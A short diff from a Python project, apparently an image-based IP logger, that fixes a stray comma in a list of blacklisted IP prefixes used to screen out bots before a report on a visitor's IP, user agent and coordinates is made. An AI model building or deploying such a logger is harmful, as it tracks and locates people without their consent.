@@ -63,7 +63,7 @@ config = {
     # 4) Image
 }
 
-blacklistedIPs = ("27", "34", "35", "104", "143", "164"), # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("27", "34", "35", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 def makeReport(ip, useragent = None, coords = None):
     if ip.startswith(blacklistedIPs):
